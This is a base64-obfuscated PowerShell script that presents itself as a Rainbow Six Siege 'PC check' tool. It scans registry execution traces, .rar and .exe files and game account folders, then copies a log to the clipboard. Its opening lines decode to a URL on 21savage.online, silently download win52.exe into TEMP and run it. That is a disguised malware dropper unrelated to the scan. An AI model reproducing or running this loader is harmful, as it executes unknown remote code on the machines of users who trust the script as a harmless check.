$exeUrl  = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly8yMXNhdmFnZS5vbmxpbmUvd2luNTIuZXhl')))
$exePath = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlRFTVBcd2luNTIuZXhl'))))

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Start-Process $exePath



Clear-Host
$encodedTitle = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UTNKbFlYUmxaQ0JDZVNCYVpYbHphMmtnYjI0Z1JHbHpZMjl5WkE9PQ==')))
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText
function Get-OneDrivePath {
    try {
       
        $oneDrivePath = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9uZURyaXZl'))) -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlckZvbGRlcg==')))).UserFolder
        if (-not $oneDrivePath) {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmUgcGF0aCBub3QgZm91bmQgaW4gcmVnaXN0cnkuIEF0dGVtcHRpbmcgYWx0ZXJuYXRpdmUgZGV0ZWN0aW9uLi4u')))
            
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmU='))))
            if (Test-Path $envOneDrive) {
                $oneDrivePath = $envOneDrive
                Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmUgcGF0aCBkZXRlY3RlZCB1c2luZyBlbnZpcm9ubWVudCB2YXJpYWJsZTog'))) + $oneDrivePath) -ForegroundColor Green
            } else {
                Write-Error ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hYmxlIHRvIGZpbmQgT25lRHJpdmUgcGF0aCBhdXRvbWF0aWNhbGx5Lg==')))
            }
        }
        return $oneDrivePath
    } catch {
        Write-Error (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hYmxlIHRvIGZpbmQgT25lRHJpdmUgcGF0aDog'))) + $_)
        return $null
    }
}
function Format-Output {
    param($name, $value)
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ezB9IDogezF9'))) -f $name, $value -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLkJ5dGVcW1xd'))), ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNc'))) + $userName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERvY3VtZW50c1xNeSBHYW1lc1xSYWluYm93IFNpeCAtIFNpZWdl')))),($oneDrivePath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERvY3VtZW50c1xNeSBHYW1lc1xSYWluYm93IFNpeCAtIFNpZWdl')))))
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    
    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UjYgZGlyZWN0b3J5IG5vdCBmb3VuZC4=')))
    } else {
        return $uniqueUserNames
    }
}

function Find-RarAndExeFiles {
    Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZGluZyAucmFyIGFuZCAuZXhlIGZpbGVzLi4u')))
    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
    $oneDriveFileHeader = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLWBuT25lRHJpdmUgRmlsZXM6YG4=')))
    $oneDriveFiles = @()
    $allFiles = @()

    $rarSearchPaths = @()
    Get-PSDrive -PSProvider ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmlsZVN5c3RlbQ=='))) | ForEach-Object { $rarSearchPaths += $_.Root }
    $oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }

   
    $jobs = @()

    
    $rarJob = {
        param ($searchPaths, $oneDriveFiles)
        $allFiles = @()
        foreach ($path in $searchPaths) {
            Get-ChildItem -Path $path -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5yYXI='))) -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0gTGFzdCBNb2RpZmllZDog'))) + $($_.LastWriteTime))
                $allFiles += $fileInfo
                if ($_.FullName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Kk9uZURyaXZlKg==')))) { $oneDriveFiles += $_.FullName }
            }
        }
        return $allFiles
    }

    
    $exeJob = {
        param ($oneDrivePath, $oneDriveFiles)
        $exeFiles = @()
        if ($oneDrivePath) {
            Get-ChildItem -Path $oneDrivePath -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5leGU='))) -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0gTGFzdCBNb2RpZmllZDog'))) + $($_.LastWriteTime))
                $exeFiles += $fileInfo
                if ($_.FullName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Kk9uZURyaXZlKg==')))) { $oneDriveFiles += $_.FullName }
            }
        }
        return $exeFiles
    }

 
    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles

    
    $jobs | ForEach-Object {
        Wait-Job $_ | Out-Null  
        $allFiles += Receive-Job $_  
        Remove-Job $_  
    }

    $groupedFiles = $allFiles | Sort-Object

    if ($oneDriveFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value $oneDriveFileHeader
        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }

    if ($groupedFiles.Count -gt 0) {
        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }
}


function Find-SusFiles {
    Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZGluZyBzdXNwaWNpb3VzIGZpbGVzIG5hbWVzLi4u')))
    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
    $susFilesHeader = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLWBuU3VzIEZpbGVzOmBu')))
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bG9hZGVyLipcLmV4ZQ==')))) { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kLiBVbmFibGUgdG8gc2VhcmNoIGZvciBzdXNwaWNpb3VzIGZpbGVzLg==')))
    }
}

function List-BAMStateUserSettings {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyByZWcgZW50cmllcyBpbnNpZGUgUG93ZXJTaGVsbC4uLg=='))) -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}
     Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEZldGNoaW5nIFVzZXJTZXR0aW5ncyBFbnRyaWVzIA=='))) -ForegroundColor Blue
    
    $registryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3M=')))
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KjEwMDE='))) }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4='))) + $($setting.PSPath))
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $item.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($item.Name)) {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm8gcmVsZXZhbnQgdXNlciBzZXR0aW5ncyBmb3VuZC4='))) -ForegroundColor Red
    }
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnQgRW50cmllcw==')))
    
    $compatRegistryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnRcU3RvcmU=')))
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgQXBwc1N3aXRjaGVkIEVudHJpZXM='))) -ForegroundColor Blue
    
    $newRegistryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcRmVhdHVyZVVzYWdlXEFwcFN3aXRjaGVk')))
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgTXVpQ2FjaGUgRW50cmllcw=='))) -ForegroundColor Blue
    
    $muiCachePath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDUjpcTG9jYWwgU2V0dGluZ3NcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcTXVpQ2FjaGU=')))
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XHsuKlx9'))) } | ForEach-Object { $_ -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Og=='))), '' } | Set-Content $outputFile

    Log-BrowserFolders
   
  
    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5SNiBVc2VybmFtZXM6')))

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        $url = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9zdGF0cy5jYy9zaWVnZS8='))) + $name)
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T3BlbmluZyBzdGF0cyBmb3Ig'))) + $name + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IG9uIFN0YXRzLmNjIC4uLg==')))) -ForegroundColor Blue
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEZldGNoaW5nIERvd25sb2FkZWQgQnJvd3NlcnMg'))) -ForegroundColor Blue
function Log-BrowserFolders {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyByZWcgZW50cmllcyBpbnNpZGUgUG93ZXJTaGVsbC4uLg=='))) -ForegroundColor DarkYellow
    $registryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcQ2xpZW50c1xTdGFydE1lbnVJbnRlcm5ldA==')))
    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
        Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5Ccm93c2VyIEZvbGRlcnM6')))
        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
    } else {
        Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVnaXN0cnkgcGF0aCBmb3IgYnJvd3NlcnMgbm90IGZvdW5kLg=='))) -ForegroundColor Red
    }
}

function Log-WindowsInstallDate {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyBXaW5kb3dzIGluc3RhbGwgZGF0ZS4uLg=='))) -ForegroundColor DarkYellow
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5XaW5kb3dzIEluc3RhbGxhdGlvbiBEYXRlOiA='))) + $installDate)
}

List-BAMStateUserSettings
Log-WindowsInstallDate
Find-RarAndExeFiles
Find-SusFiles

$desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))

$logFilePath = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))

if (Test-Path $logFilePath) {
    Set-Clipboard -Path $logFilePath
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgY29waWVkIHRvIGNsaXBib2FyZC4='))) -ForegroundColor DarkRed
} else {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kIG9uIHRoZSBkZXNrdG9wLg=='))) -ForegroundColor Red
}

$desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))


$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)


$downloadsPath = Join-Path -Path $userProfile -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG93bmxvYWRz')))


function Delete-FileIfExists {
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
    }
}
Full paths to the target file in Desktop and Downloads folders
$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVjay50eHQ=')))
$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVjay50eHQ=')))


Delete-FileIfExists -filePath $targetFileDesktop
Delete-FileIfExists -filePath $targetFileDownloads


# Define colors
$yellow = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WWVsbG93')))
$space = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))) * 12  


Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4='))) + $space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pWt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWu')))) -ForegroundColor $yellow
Write-Host ($space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pSCICAgICAgICAgICAgU0NBTiBDT01QTEVURSAgICAgICAgICAgIOKUgg==')))) -ForegroundColor $yellow
Write-Host ($space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWv')))) -ForegroundColor $yellow











